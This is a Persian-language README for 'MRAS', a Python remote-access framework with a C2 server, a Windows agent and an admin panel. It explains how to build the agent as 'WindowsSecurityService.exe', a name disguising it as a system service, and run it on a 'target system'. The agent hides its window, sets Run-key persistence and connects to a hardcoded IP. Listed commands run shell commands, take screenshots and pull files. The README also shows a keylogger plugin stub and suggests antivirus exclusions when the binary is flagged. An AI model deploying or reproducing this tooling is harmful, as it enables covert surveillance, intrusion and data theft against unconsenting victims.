# MRAS — Modular Remote Admin System

یک فریم‌ورک حرفه‌ای، ماژولار و آماده پروداکشن برای مدیریت ریموت، ساخته‌شده با Python.

---

## فهرست مطالب

- [معماری](#معماری)
- [راه‌اندازی سرور](#-راهاندازی-سرور)
- [ساخت و استقرار کلاینت ویندوز](#-ساخت-و-استقرار-کلاینت-ویندوز)
- [پنل ادمین — Web Panel](#-پنل-ادمین--web-panel)
- [پنل ادمین — CLI](#-پنل-ادمین--cli)
- [دستورات ادمین](#دستورات-ادمین)
- [اضافه کردن دستور جدید](#اضافه-کردن-دستور-جدید)
- [امنیت](#امنیت)
- [Failover و Resilience](#failover-و-resilience)
- [عیب‌یابی](#عیبیابی)
- [چک‌لیست پروداکشن](#چکلیست-پروداکشن)

---

## معماری

```
MRAS/
├── shared/               # پروتکل، رمزنگاری، مدل‌های داده (مشترک بین همه بخش‌ها)
│   ├── models.py         # انواع پیام، ClientInfo، enum‌ها
│   ├── crypto.py         # رمزنگاری Fernet با کلید مشتق‌شده از PBKDF2
│   └── protocol.py       # encode/decode سیمی با رمزنگاری
│
├── server/               # C2 Relay Server — asyncio WebSocket
│   ├── main.py           # نقطه ورود، روتر اتصال‌ها
│   ├── auth.py           # تأیید توکن، rate limiting
│   ├── storage.py        # رجیستری کلاینت‌ها، صف pending
│   └── config.yaml       # تنظیمات سرور
│
├── client/               # Remote Agent
│   ├── main.py           # نقطه ورود، مخفی‌سازی کنسول، persistence
│   ├── connection.py     # اتصال WebSocket، failover، heartbeat
│   ├── persistence.py    # ماندگاری cross-platform (Registry/systemd/LaunchAgent)
│   ├── config.yaml       # تنظیمات کلاینت
│   └── commands/         # Command Pattern — هر فایل جدید = دستور جدید
│       ├── registry.py       # ثبت و auto-discover دستورات
│       ├── execute.py        # اجرای دستور shell
│       ├── screenshot.py     # عکس از صفحه (mss + Pillow)
│       ├── file_transfer.py  # آپلود / دانلود / لیست دایرکتوری
│       ├── change_server.py  # به‌روزرسانی لیست سرور در زمان اجرا
│       └── sysinfo.py        # اطلاعات سیستم
│
├── admin/                # کنترل پنل ادمین
│   ├── main.py           # CLI تعاملی (Rich)
│   ├── web_server.py     # Web Panel — FastAPI + WebSocket bridge
│   ├── connection.py     # اتصال احراز هویت‌شده به سرور
│   ├── static/
│   │   └── index.html    # SPA با تم دارک امنیتی
│   └── config.yaml       # تنظیمات ادمین
│
├── client.spec           # PyInstaller spec برای build ویندوز
└── requirements.txt
```

جریان کلی:
```
Admin  ──→  Server (C2)  ──→  Client(s)
       ←──            ←──
```

---

## ⚙ راه‌اندازی سرور

### پیش‌نیاز
- Python 3.10 یا بالاتر
- یک VPS/سرور با آی‌پی عمومی

### مرحله ۱ — کلون پروژه و نصب وابستگی‌ها

```bash
git clone <repo-url>
cd MRAS
pip install -r requirements.txt
```

### مرحله ۲ — تنظیم `server/config.yaml`

```yaml
server:
  host: "0.0.0.0"       # به همه اینترفیس‌ها گوش بده
  port: 8765
  secret: "یک-رشته-تصادفی-قوی"        # ← این را عوض کن
  admin_token: "توکن-ادمین-قوی"        # ← این را عوض کن
  max_pending_commands: 100
  heartbeat_timeout: 60
  rate_limit_per_second: 20

logging:
  level: "INFO"
  file: "logs/server.log"
  rotation: "10 MB"
```

یا از environment variable استفاده کن (توصیه‌شده):

```bash
export MRAS_SECRET="یک-رشته-تصادفی-قوی-که-کسی-نمیدونه"
export MRAS_ADMIN_TOKEN="توکن-ادمین-مخفی"
```

### مرحله ۳ — باز کردن پورت فایروال

```bash
# Ubuntu/Debian
ufw allow 8765/tcp
ufw reload

# CentOS/RHEL
firewall-cmd --permanent --add-port=8765/tcp
firewall-cmd --reload
```

### مرحله ۴ — اجرای سرور

**اجرای ساده (تست):**
```bash
python server/main.py
```

**اجرای دائمی با systemd (توصیه‌شده):**

```bash
# ساخت فایل سرویس
sudo nano /etc/systemd/system/mras-server.service
```

```ini
[Unit]
Description=MRAS C2 Server
After=network.target

[Service]
Type=simple
User=ubuntu
WorkingDirectory=/home/ubuntu/MRAS
ExecStart=/usr/bin/python3 server/main.py
Restart=always
RestartSec=5
Environment=MRAS_SECRET=یک-رشته-تصادفی-قوی
Environment=MRAS_ADMIN_TOKEN=توکن-ادمین-مخفی

[Install]
WantedBy=multi-user.target
```

```bash
sudo systemctl daemon-reload
sudo systemctl enable mras-server
sudo systemctl start mras-server

# بررسی وضعیت
sudo systemctl status mras-server
sudo journalctl -u mras-server -f
```

**اجرا با PM2:**
```bash
pm2 start "python server/main.py" --name mras-server
pm2 save
pm2 startup
```

### تأیید اجرای سرور

```bash
# بررسی که پورت باز است
netstat -tlnp | grep 8765
# یا
ss -tlnp | grep 8765
```

باید خروجی مشابه زیر ببینی:
```
tcp  0  0  0.0.0.0:8765  0.0.0.0:*  LISTEN  12345/python3
```

---

## 🖥 ساخت و استقرار کلاینت ویندوز

### مرحله ۱ — تنظیم آدرس سرور در `client/config.yaml`

```yaml
client:
  servers:
    - "ws://94.183.170.121:8765"    # ← آی‌پی سرور خودت
  secret: "یک-رشته-تصادفی-قوی"      # ← باید دقیقاً با سرور یکسان باشد
  reconnect_delay: 5
  reconnect_max_delay: 60
  heartbeat_interval: 20
  config_update_url: ""
  config_update_interval: 300

logging:
  level: "INFO"
  file: "logs/client.log"
```

> **مهم:** مقدار `secret` باید **کاراکتر به کاراکتر** با مقدار `secret` در `server/config.yaml` یکسان باشد.

### مرحله ۲ — نصب PyInstaller

```bash
pip install pyinstaller
```

### مرحله ۳ — ساخت فایل اجرایی

از **ریشه پروژه** اجرا کن:

```bash
pyinstaller client.spec
```

بعد از اتمام، فایل اجرایی اینجاست:
```
dist/WindowsSecurityService.exe
```

### مرحله ۴ — آماده‌سازی پوشه استقرار

```
deploy/
├── WindowsSecurityService.exe
└── client/
    └── config.yaml          ← فایل تنظیم‌شده با آی‌پی سرور
```

### مرحله ۵ — اجرا روی سیستم هدف

فایل `WindowsSecurityService.exe` را روی سیستم هدف اجرا کن.

برنامه به طور خودکار:
1. پنجره کنسول را مخفی می‌کند (کاملاً بی‌صدا)
2. در پس‌زمینه اجرا می‌شود
3. خود را در رجیستری ثبت می‌کند (بدون نیاز به admin):
   ```
   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   → WindowsSecurityService = "C:\path\to\WindowsSecurityService.exe"
   ```
4. به سرور وصل می‌شود و منتظر دستور می‌ماند
5. در صورت قطع اتصال، با exponential backoff دوباره وصل می‌شود

### تست سریع بدون build (اختیاری)

برای اطمینان از اتصال قبل از build:

```bash
python client/main.py
```

اگر در لاگ سرور یک خط `Client authenticated` دیدی، همه چیز درست است.

---

## 🌐 پنل ادمین — Web Panel

### اجرا

```bash
# اتصال به سرور با آدرس پیش‌فرض از admin/config.yaml
python admin/web_server.py

# اتصال به سرور با آدرس دلخواه
python admin/web_server.py --mras-server ws://94.183.170.121:8765

# باز کردن مرورگر به‌صورت خودکار
python admin/web_server.py --mras-server ws://94.183.170.121:8765 --open

# تغییر پورت web panel
python admin/web_server.py --port 9090
```

سپس مرورگر را باز کن:
```
http://127.0.0.1:8080
```

### تنظیم `admin/config.yaml`

```yaml
admin:
  server: "ws://94.183.170.121:8765"   # ← آدرس سرور
  admin_token: "توکن-ادمین-مخفی"       # ← باید با سرور یکسان باشد
  secret: "یک-رشته-تصادفی-قوی"         # ← باید با سرور یکسان باشد
  command_timeout: 30
  download_dir: "downloads"

logging:
  level: "INFO"
  file: "logs/admin.log"
```

### قابلیت‌های Web Panel

| بخش | توضیح |
|-----|-------|
| **Sidebar** | لیست زنده agent‌ها با نقطه سبز پالس‌دار |
| **Terminal** | shell تعاملی با history دستورات (↑↓) |
| **Agents** | نمای کارت‌گرید با دکمه‌های سریع |
| **Screenshots** | گالری با modal zoom و دانلود |
| **Files** | مرورگر فایل ریموت + آپلود/دانلود کلیکی |
| **Sysinfo** | اطلاعات CPU/RAM/Disk با progress bar |
| **Activity Log** | لاگ تمام رویدادها به صورت realtime |

---

## 💻 پنل ادمین — CLI

برای کسانی که ترجیح می‌دهند از ترمینال استفاده کنند:

```bash
# اتصال با تنظیمات پیش‌فرض
python admin/main.py

# اتصال با آدرس و توکن دلخواه
python admin/main.py --server ws://94.183.170.121:8765 --token توکن-ادمین-مخفی
```

---

## دستورات ادمین

این دستورات هم در **CLI** و هم در **Terminal** وب پنل قابل استفاده‌اند:

### مدیریت Agent‌ها

| دستور | توضیح |
|-------|-------|
| `list` | لیست تمام کلاینت‌های آنلاین |
| `select <id>` | انتخاب کلاینت هدف (پیشوند کافیست) |

### اجرای دستور

| دستور | توضیح | مثال |
|-------|-------|------|
| `exec <cmd>` | اجرای هر دستور shell/cmd | `exec whoami` |
| `exec <cmd>` | حذف فایل (ویندوز) | `exec del /f C:\file.txt` |
| `exec <cmd>` | حذف فایل (لینوکس) | `exec rm -rf /tmp/dir` |
| `exec <cmd>` | اجرای چند دستور | `exec whoami && ipconfig` |

### فایل و سیستم

| دستور | توضیح | مثال |
|-------|-------|------|
| `screenshot` | عکس از صفحه (PNG) | `screenshot` |
| `screenshot --jpeg` | عکس از صفحه (JPEG) | `screenshot --jpeg` |
| `sysinfo` | اطلاعات کامل سیستم | `sysinfo` |
| `dir [path]` | لیست محتوای دایرکتوری | `dir C:\Users` |
| `download <path>` | دانلود فایل از کلاینت | `download C:\secret.txt` |
| `upload <local> <remote>` | آپلود فایل به کلاینت | `upload tool.exe C:\tool.exe` |

### مدیریت سرور

| دستور | توضیح | مثال |
|-------|-------|------|
| `servers <uri> [...]` | push لیست سرور جدید به کلاینت | `servers ws://1.2.3.4:8765 ws://backup:8765` |
| `redirect <uri>` | redirect کلاینت به سرور جدید | `redirect ws://newserver:8765` |

### متفرقه

| دستور | توضیح |
|-------|-------|
| `help` | نمایش راهنما |
| `clear` | پاک کردن ترمینال |
| `quit` / `exit` | خروج |

---

## اضافه کردن دستور جدید

فقط یک فایل در `client/commands/` بساز:

```python
# client/commands/keylogger.py
from client.commands.registry import register

@register("keylogger_start")
async def keylogger_start(payload: dict) -> dict:
    duration = payload.get("duration", 10)
    # کد keylogger اینجا...
    return {"keys": "captured_keys_here"}
```

همین — فایل به‌صورت خودکار کشف و ثبت می‌شود. هیچ جای دیگری نیاز به تغییر نیست.

---

## امنیت

| ویژگی | جزئیات |
|--------|---------|
| **رمزنگاری کانال** | Fernet (AES-128-CBC + HMAC-SHA256) با کلید مشتق‌شده از PBKDF2 (100,000 iteration) |
| **Salt یکتا per session** | هر اتصال یک salt تصادفی ۱۶ بایتی تولید می‌کند — session key‌ها منحصربه‌فردند |
| **احراز هویت توکن** | کلاینت: HMAC-derived token | ادمین: توکن مستقل |
| **Rate limiting** | حداکثر ۲۰ پیام در ثانیه per connection |
| **محافظت file size** | حداکثر ۵۰ MB برای دانلود |
| **اجرای امن دستور** | subprocess با `/bin/sh -c` یا `cmd.exe /c` — بدون shell injection در سایر دستورات |

---

## Failover و Resilience

- کلاینت **لیست مرتب‌شده** از سرورها دارد (primary + backup)
- در صورت قطع اتصال، **به ترتیب** سرورهای بعدی را امتحان می‌کند
- **Exponential backoff**: ۵ ثانیه ← ۱۰ ← ۲۰ ← ... تا حداکثر ۶۰ ثانیه
- ادمین می‌تواند **لیست سرور جدید push کند** (`servers` command)
- ادمین می‌تواند کلاینت را **redirect کند** (`redirect` command)
- **Config update URL**: کلاینت هر X دقیقه از یک URL مرکزی لیست سرور به‌روز می‌گیرد
- سرور دستورات کلاینت‌های آفلاین را در **صف pending** نگه می‌دارد (حداکثر ۱۰۰ عدد)

---

## عیب‌یابی

### کلاینت وصل نمی‌شود

```bash
# ۱. بررسی که سرور در حال اجراست
sudo systemctl status mras-server

# ۲. بررسی که پورت باز است
netstat -tlnp | grep 8765

# ۳. بررسی فایروال
ufw status | grep 8765

# ۴. تست از سیستم هدف
telnet 94.183.170.121 8765
# یا
curl -v http://94.183.170.121:8765
```

### خطای احراز هویت (Auth Failed)

مقدار `secret` را در هر دو فایل چک کن — باید **کاراکتر به کاراکتر** یکسان باشند:
- `server/config.yaml` → `secret`
- `client/config.yaml` → `secret`
- `admin/config.yaml` → `secret`

### exe اجرا نمی‌شود (ویندوز)

نصب Microsoft Visual C++ Redistributable:
```
https://aka.ms/vs/17/release/vc_redist.x64.exe
```

### آنتی‌ویروس exe را حذف می‌کند

این اتفاق برای اکثر binary‌های PyInstaller می‌افتد.  
راه‌حل: exe را در آنتی‌ویروس به Exclusion اضافه کن، یا exe را code-sign کن.

### لاگ‌ها را کجا ببینیم؟

```bash
# سرور
tail -f logs/server.log

# کلاینت (اگر به‌صورت .py اجرا شود)
tail -f logs/client.log

# ادمین
tail -f logs/admin.log
```

---

## چک‌لیست پروداکشن

- [ ] مقادیر `secret` و `admin_token` را در همه configها عوض کن (حداقل ۳۲ کاراکتر تصادفی)
- [ ] از environment variable به جای config file برای secretها استفاده کن
- [ ] سرور را پشت یک reverse proxy (nginx/caddy) با TLS بگذار و از `wss://` استفاده کن
- [ ] سرور را با systemd یا PM2 به صورت دائمی اجرا کن
- [ ] پورت‌های غیرضروری را ببند (فقط ۸۷۶۵ برای سرور باز باشد)
- [ ] دسترسی Web Panel را فقط به localhost محدود کن یا پشت VPN بگذار
- [ ] لاگ‌ها را در دایرکتوری `logs/` بررسی کن
- [ ] client binary را با PyInstaller build کن:
  ```bash
  pyinstaller client.spec
  # خروجی: dist/WindowsSecurityService.exe
  ```
